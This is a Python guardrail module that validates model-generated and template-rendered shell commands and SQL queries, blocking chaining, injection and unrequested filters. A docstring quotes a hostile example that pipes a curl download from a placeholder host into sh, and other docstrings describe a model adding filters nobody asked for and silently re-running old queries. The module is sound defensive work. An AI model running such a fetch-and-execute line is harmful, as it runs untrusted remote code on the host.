"""
Guardrails for the commands and queries this service proposes.

Deliberately duplicated with the gateway's validation. The gateway checks that a
definition is *well formed* when it is saved; this checks that the command about to be
proposed is permitted. They protect different moments, and this one is the last line
before a command reaches an executor, so it does not delegate.

Two callers with different trust assumptions share these checks:

* a model authored command is untrusted in full, so an action with no allowlist has
  nothing to authorise it and is rejected outright;
* a static command comes from a template an operator wrote, so the template is trusted
  but the argument values substituted into it are not.

:func:`check_command` and :func:`check_query` take the strict view. The ``static_``
variants take the second, and add the check the first does not need: whether an argument
smuggled shell or SQL syntax past a template that reads as a single statement.
"""

from __future__ import annotations

import re
from collections.abc import Container, Sequence
from dataclasses import dataclass, field

from app.models import ActionConfig


@dataclass(frozen=True)
class GuardrailVerdict:
    """Outcome of checking one generated command or query."""

    allowed: bool
    reasons: list[str] = field(default_factory=list)

    @staticmethod
    def ok() -> "GuardrailVerdict":
        return GuardrailVerdict(allowed=True)

    @staticmethod
    def rejected(*reasons: str) -> "GuardrailVerdict":
        return GuardrailVerdict(allowed=False, reasons=list(reasons))


#: Bind parameters a generated statement must not contain.
#:
#: The executor runs a generated query with no arguments, so a placeholder can never be
#: filled and the statement is guaranteed to fail at the database. A model asked for "the
#: last ten runs" will happily write ``created_at >= $1`` and leave the value to somebody
#: else — which reads as a reasonable query and is an unrunnable one.
_BIND_PARAMETERS = re.compile(r"(?<![\w$])\$\d+|(?<![\w:]):[a-zA-Z_]\w*")


def check_command(command: str, config: ActionConfig) -> GuardrailVerdict:
    """
    Validate a generated shell command.

    Three independent gates, all of which must pass:

    * the command has to start with one of the allowed prefixes, unless the action names
      ``*`` and takes any command
    * it must not chain, pipe, redirect or substitute
    * it must not contain any blocked pattern

    The blocklist is checked even when the prefix matched, because a permitted prefix can
    still be followed by something destructive.

    The middle gate is what makes the first one mean anything. A prefix check reads the
    beginning of a string, so ``sudo apt-get install -y python3; curl http://x | sh``
    passed it — the allowed prefix was there, and everything after the semicolon was a
    second command nobody had approved. Against a model writing the command, an allowlist
    that any punctuation mark walks around is decoration.

    An operator who genuinely needs a pipeline writes it as a *static* command, where the
    template is theirs and only the values substituted into it are checked. That is the
    line this whole module is drawn on: what the operator wrote is trusted, what a model
    wrote is not.
    """
    candidate = command.strip()

    if not candidate:
        return GuardrailVerdict.rejected("The generated command is empty")

    reasons: list[str] = []
    allowed = config.allowed_commands

    chained = [mark for mark in SHELL_METACHARACTERS if mark in candidate]
    if chained:
        reasons.append(
            "A generated command may not chain, pipe, redirect or substitute; found "
            + ", ".join(repr(mark) for mark in chained)
            + ". Ask for one thing at a time, or — if the pipeline is yours rather than "
            "the model's — write it as a static command"
        )

    if not allowed:
        reasons.append("No allowed command prefix is configured for this action")
    elif not unrestricted(allowed) and not any(
        candidate.startswith(prefix.strip()) for prefix in allowed if prefix.strip()
    ):
        reasons.append(
            f"Command does not start with an allowed prefix: {sorted(allowed)}"
        )

    lowered = candidate.lower()
    for pattern in config.blocked_patterns:
        needle = pattern.strip().lower()
        if needle and needle in lowered:
            reasons.append(f"Command contains a blocked pattern: {pattern}")

    return GuardrailVerdict.ok() if not reasons else GuardrailVerdict(False, reasons)


def check_query(query: str, config: ActionConfig) -> GuardrailVerdict:
    """
    Validate a generated SQL statement.

    Only the leading keyword is inspected. That is enough to reject a statement type the
    action does not permit, and this service never claims to be a SQL parser: the
    database itself remains the authority, and a read-only connection is the real
    enforcement.
    """
    candidate = query.strip()

    if not candidate:
        return GuardrailVerdict.rejected("The generated query is empty")

    reasons: list[str] = []
    allowed = {op.strip().lower() for op in config.allowed_operations if op.strip()}

    if not allowed:
        reasons.append("No permitted statement type is configured for this action")
    else:
        leading = candidate.split(None, 1)[0].lower().rstrip(";")
        if leading not in allowed:
            reasons.append(
                f"Statement type '{leading}' is not permitted; allowed: {sorted(allowed)}"
            )
        if config.read_only and leading != "select":
            reasons.append("The action is read only, so only select is permitted")

    if ";" in candidate.rstrip().rstrip(";"):
        # A trailing semicolon is fine; one in the middle means several statements,
        # which would slip past a check that only reads the leading keyword.
        reasons.append("Multiple statements in one query are not permitted")

    if found := _BIND_PARAMETERS.findall(candidate):
        reasons.append(
            "The query uses bind parameters nothing will fill "
            f"({', '.join(sorted(set(found)))}); write the values into the statement"
        )

    return GuardrailVerdict.ok() if not reasons else GuardrailVerdict(False, reasons)


#: The allowlist entry that stands for "any single command".
#:
#: Spelled rather than implied. An empty allowlist could have been made to mean this, and
#: then a field somebody forgot to fill in would be an open door — the two states have to
#: look different, because one is a decision and the other is an oversight.
ANY_COMMAND = "*"


def unrestricted(allowed: Sequence[str]) -> bool:
    """
    Whether this action permits any command its other gates allow.

    Not *any* command: what is left is still one command — no chaining, no pipe, no
    redirection, no substitution — minus whatever the blocklist names. That is a much
    weaker position than a prefix list and a defensible one for a machine somebody is
    experimenting on. It is worth saying on screen every time it is used, which is why
    the planner reports it rather than this function refusing it.
    """
    return any(entry.strip() == ANY_COMMAND for entry in allowed)


#: A filter on a string value: ``domain = 'x'``, ``status IN ('a', 'b')``, ``name LIKE '%x%'``.
#:
#: Only comparisons, so a literal in a select list or a CASE expression is left alone —
#: those do not narrow a result, and narrowing is what makes a wrong answer look right.
_STRING_FILTER = re.compile(
    r"""([A-Za-z_][\w.]*)                    # the column
        \s*(=|!=|<>|\blike\b|\bin\b)\s*      # the comparison
        \(?\s*
        '((?:[^']|'')*)'                     # the first literal it is compared against
    """,
    re.IGNORECASE | re.VERBOSE,
)


def unrequested_filters(query: str, *sources: str) -> list[str]:
    """
    Filters on values nobody mentioned.

    A model writing SQL from a schema will narrow a result on its own. Asked how many
    accounts there were it wrote ``where domain = 'bireysel'`` — taking the word from the
    action's own name — and answered 0 where the answer was 585. Asked for the three
    busiest domains it wrote ``where status = 'active'``, which nobody had asked for and
    which quietly changed what the number meant. Both statements are valid SQL, both run,
    and both report success: there is nothing for a database or a syntax check to object
    to, and the person reading the answer has no way to tell.

    The system prompt forbids this in as many words and the model does it anyway, so it is
    checked here as well. Reported rather than refused: narrowing is often exactly right,
    and a guardrail that blocked every filtered query would make dynamic queries useless.
    What a warning buys is that the person reading the answer knows what it excludes.

    What this can honestly claim is narrow: the value is not in the request. It is not
    always the same as "nobody asked for it" — "aktif hesaplarin dagilimi" asks for exactly
    the ``status = 'active'`` this reports, in another language, and no string comparison
    will ever see that. So it returns the filters and says nothing about them; the caller
    puts the question to somebody who can answer it.

    ``sources`` are the texts a value may legitimately come from — the request in the words
    it was made in, the arguments supplied with it, and whatever the operator wrote as
    guidance. A literal found in any of them was asked for by somebody.

    Numbers and dates are not checked. A row limit and a date derived from "last week" are
    both absent from the request by nature, and flagging them would mean a warning on
    nearly every query — which is the same as no warning at all.
    """
    haystack = " ".join(sources).casefold()
    flagged: list[str] = []

    for column, operator, literal in _STRING_FILTER.findall(query):
        value = literal.replace("''", "'").strip()

        # An empty literal is an idiom (`!= ''`), not a value somebody chose.
        if not value:
            continue

        # A LIKE pattern is the same value with wildcards around it; the request would
        # carry the word, never the percent signs.
        bare = value.strip("%").casefold()
        if not bare or bare in haystack:
            continue

        flagged.append(f"{column} {operator.lower()} '{value}'")

    return flagged


def repeats_earlier(query: str, earlier: Sequence[str]) -> bool:
    """
    Whether this statement is one the conversation has already run.

    A deterministic check, and it is here because the prompt wording that produces this is
    endless. "bugüne kadar getirdiğin sonuçları listeler misin?" was fixed by naming that
    shape in the router's instructions; "Önceki tüm sonuçları tablo olarak getir" arrived
    the next day and was routed to the tool, which re-ran a query from seven turns earlier
    and presented its rows as "all previous results".

    Nobody is served by running the same statement twice in a row silently. If they meant
    to re-run it the answer is the same and they lose nothing by being told; if they meant
    something else — which is the usual case, because a request to *summarise* reads like a
    request to *fetch* — then the result they are looking at answers a question they did
    not ask, and nothing on the screen would have said so.

    Compared against every statement still in the window rather than only the last, because
    the repeat is rarely of the previous turn: a half-typed message or a refusal sits in
    between, and the statement that comes back is from further up.
    """
    normalised = _normalise(query)
    return any(normalised == _normalise(previous) for previous in earlier if previous)


def _normalise(statement: str) -> str:
    """Whitespace, case and a trailing semicolon are not differences."""
    return " ".join(statement.split()).rstrip(";").casefold()


def echoes_the_request(query: str, request: str) -> list[str]:
    """
    Filters whose value is the request itself.

    A model reading a sentence can either take a value out of it or mistake the whole
    sentence for one. The second produces valid SQL that cannot match anything: half a
    typed message — "önceki t", sent by an early Enter — became
    ``where email = 'önceki t'``, which runs, returns nothing, and reports success.

    Not caught by :func:`unrequested_filters`, and it cannot be: the value is in the
    request, word for word. That is the whole problem with it.
    """
    asked = _normalise(request)

    if not asked:
        return []

    flagged: list[str] = []

    for column, operator, literal in _STRING_FILTER.findall(query):
        value = _normalise(literal.replace("''", "'").strip("%"))

        # The whole question, or nearly. A value that happens to be a long phrase from the
        # request is fine — an address, a name with a space — so this asks whether what is
        # left of the request after removing it is essentially nothing.
        if value and value == asked:
            flagged.append(f"{column} {operator.lower()} '{literal}'")

    return flagged


#: Shell syntax that lets one command become two. An argument has no business carrying
#: any of it: the operator wrote the command, the caller only fills in a value.
SHELL_METACHARACTERS = (";", "&&", "||", "|", "`", "$(", "\n", ">", "<")

#: The marks that put one command after another, as opposed to joining them into one.
#:
#: Split from the rest of SHELL_METACHARACTERS because the first half of a sequence is a
#: whole command and the first half of a pipeline is not: `dnf install -y httpd` does what
#: it did in the chain, and `cat access.log` without its `| grep 500` does something else
#: entirely.
SEQUENCERS = ("&&", "||", ";", "\n")


def _sequencer_outside_quotes(command: str) -> tuple[int, str] | None:
    """
    Where the first sequencing mark is, ignoring the ones inside quotes.

    A mark inside a quoted string is text, not syntax, and cutting there produces something
    that is not a command at all. A model asked to write a python file wrote::

        echo '#!/usr/bin/python3
        print("merhaba")' > /tmp/x.py

    and a splitter that treated every newline as a boundary handed the executor
    ``echo '#!/usr/bin/python3`` — an unterminated quote, which bash answered with
    "unexpected EOF while looking for matching `'`". Worse, the half it kept no longer had
    the ``>`` in it, so a command the guardrails would have refused went through.

    Returns ``None`` when there is nothing to cut on, and also when the quoting does not
    close: a command nobody can parse is not one to take half of.
    """
    quote: str | None = None
    index = 0

    while index < len(command):
        char = command[index]

        # A backslash escapes the next character everywhere except inside single quotes,
        # where the shell treats it literally.
        if char == "\\" and quote != "'":
            index += 2
            continue

        if quote is not None:
            if char == quote:
                quote = None
            index += 1
            continue

        if char in ("'", '"'):
            quote = char
            index += 1
            continue

        for mark in SEQUENCERS:
            if command.startswith(mark, index):
                return index, mark

        index += 1

    return None


def first_command(command: str) -> tuple[str, str]:
    """
    Splits a chain into the command to run now and the rest, in words.

    A model told "one command, and only one" writes `dnf install -y httpd && systemctl
    enable --now httpd` anyway, often enough that the instruction cannot be the whole
    answer — it is one goal and two commands, and the sentence for it is the obvious one to
    type. Refusing the whole thing loses the install as well as the start.

    So the chain is cut where the model already put the boundary. What comes back is the
    first command, checked from here exactly as any other would be, and the remainder as
    something the reader can see was left. Only sequencing marks are cut on: a pipeline is
    one command in two halves and cutting it changes what it does.

    Returns the command unchanged, with an empty remainder, whenever there is no safe cut
    to make. Nothing is invented here: what cannot be cut goes on to the ordinary check,
    which refuses it and says why — and "found '|'" is a truer account of a pipeline than
    anything this could report.
    """
    stripped = command.strip()

    earliest = _sequencer_outside_quotes(stripped)

    if earliest is None:
        return stripped, ""

    at, mark = earliest
    head = stripped[:at].strip()
    tail = stripped[at + len(mark):].strip()

    # A pipeline, a redirect or a substitution inside the first segment means the cut did
    # not produce a single command after all. Nothing is salvaged from that: it goes back
    # as it came and the ordinary refusal covers it.
    if not head or any(found in head for found in ("|", ">", "<", "`", "$(")):
        return stripped, ""

    return head, tail


#: A heredoc, and whether its terminator was quoted.
#:
#: The quoting is the whole point. ``<<'EOF'`` puts the shell in a mode where it expands
#: nothing until the terminator — no ``$VAR``, no ``$(…)``, no backticks — so a body placed
#: inside one is text and cannot become syntax. ``<<EOF`` expands all three, and a file's
#: contents dropped into that is an injection with extra steps.
_HEREDOC = re.compile(
    r"<<-?[ \t]*(?:'(?P<single>[A-Za-z_][A-Za-z0-9_]*)'"
    r"|\"(?P<double>[A-Za-z_][A-Za-z0-9_]*)\""
    r"|(?P<bare>[A-Za-z_][A-Za-z0-9_]*))"
)


def check_static_command(
    command: str, config: ActionConfig, substituted: dict[str, str],
    blocks: Container[str] = (),
) -> GuardrailVerdict:
    """
    Validate a command rendered from an operator's template.

    The blocklist applies exactly as it does to a generated command: a pattern the action
    declares unacceptable is unacceptable however the command came to contain it. The
    allowlist applies only when one is configured, because a static action is not
    required to declare one — the template *is* the authorisation, and demanding an
    allowlist too would reject every definition written before this check existed.

    What a generated command cannot do and this one can is inherit an injection from its
    arguments, so each substituted value is inspected for syntax that would end the
    command and start another.

    ``blocks`` names the inputs declared as bodies of text rather than as words — a file's
    contents, a config, a script. Those cannot pass that inspection and should not have to:
    a newline is what a file is made of, and refusing one refuses the whole idea. They are
    held to a different rule instead, and a narrower one. The command must place them in a
    *quoted* heredoc, where the shell expands nothing at all, and their text may not contain
    the terminator that would close it. Inside those two, there is no command syntax in
    scope for the value to reach — which is a stronger statement than "we did not find a
    semicolon".
    """
    candidate = command.strip()

    if not candidate:
        return GuardrailVerdict.rejected("The resolved command is empty")

    reasons: list[str] = []
    allowed = [prefix.strip() for prefix in config.allowed_commands if prefix.strip()]

    if allowed and not any(candidate.startswith(prefix) for prefix in allowed):
        reasons.append(f"Command does not start with an allowed prefix: {sorted(allowed)}")

    lowered = candidate.lower()
    for pattern in config.blocked_patterns:
        needle = pattern.strip().lower()
        if needle and needle in lowered:
            reasons.append(f"Command contains a blocked pattern: {pattern}")

    words = {key: value for key, value in substituted.items() if key not in blocks}
    bodies = {key: value for key, value in substituted.items() if key in blocks}

    reasons.extend(_injected_syntax(words, SHELL_METACHARACTERS, "command"))
    reasons.extend(_heredoc_problems(candidate, bodies))

    return GuardrailVerdict.ok() if not reasons else GuardrailVerdict(False, reasons)


def _heredoc_problems(command: str, bodies: dict[str, str]) -> list[str]:
    """
    Why these bodies cannot safely go into this command.

    Empty when there are none to place: a template with no block input is not required to
    contain a heredoc, and most do not.
    """
    if not bodies:
        return []

    heredocs = list(_HEREDOC.finditer(command))

    if not heredocs:
        return [
            "A text block may only be substituted into a quoted heredoc "
            "(cat > file <<'EOF' … EOF); this command has none"
        ]

    bare = [match.group("bare") for match in heredocs if match.group("bare")]
    if bare:
        return [
            "A heredoc holding a text block must be quoted — <<'"
            + bare[0]
            + "' rather than <<"
            + bare[0]
            + " — or the shell expands $(…) and backticks inside the body"
        ]

    terminators = {
        match.group("single") or match.group("double") for match in heredocs
    }

    reasons: list[str] = []

    # By key and terminator, never by value: the operator fixing this needs to know which
    # input ended the block early, not to have its contents printed back at them.
    for key in sorted(bodies):
        lines = {line.strip() for line in bodies[key].splitlines()}
        closed = sorted(terminators & lines)
        if closed:
            reasons.append(
                f"Input '{key}' contains the heredoc terminator "
                f"{', '.join(repr(word) for word in closed)} on a line of its own, "
                "which would end the block early"
            )

    return reasons


def check_static_query(
    query: str, config: ActionConfig, substituted: dict[str, str]
) -> GuardrailVerdict:
    """
    Validate a SQL statement rendered from an operator's template.

    Same division as :func:`check_static_command`: the permitted statement types are
    enforced when the action declares them, the read-only rule is enforced whenever it is
    set, and an argument that carries a semicolon is rejected because a template that
    reads as one statement must not become two.
    """
    candidate = query.strip()

    if not candidate:
        return GuardrailVerdict.rejected("The resolved query is empty")

    reasons: list[str] = []
    allowed = {op.strip().lower() for op in config.allowed_operations if op.strip()}
    leading = candidate.split(None, 1)[0].lower().rstrip(";")

    if allowed and leading not in allowed:
        reasons.append(
            f"Statement type '{leading}' is not permitted; allowed: {sorted(allowed)}"
        )
    if config.read_only and leading != "select":
        reasons.append("The action is read only, so only select is permitted")

    if ";" in candidate.rstrip().rstrip(";"):
        reasons.append("Multiple statements in one query are not permitted")

    reasons.extend(_injected_syntax(substituted, (";", "--", "/*"), "query"))

    return GuardrailVerdict.ok() if not reasons else GuardrailVerdict(False, reasons)


def _injected_syntax(
    substituted: dict[str, str], markers: tuple[str, ...], noun: str
) -> list[str]:
    """
    Report arguments that carry syntax capable of extending the statement.

    Reported by key and marker, never by value: the value may be a secret, and the
    operator fixing this needs to know which input to constrain, not what was sent.
    """
    reasons: list[str] = []

    for key in sorted(substituted):
        value = substituted[key]
        found = [marker for marker in markers if marker in value]
        if found:
            reasons.append(
                f"Input '{key}' contains {noun} syntax and cannot be substituted: "
                f"{', '.join(repr(marker) for marker in found)}"
            )

    return reasons
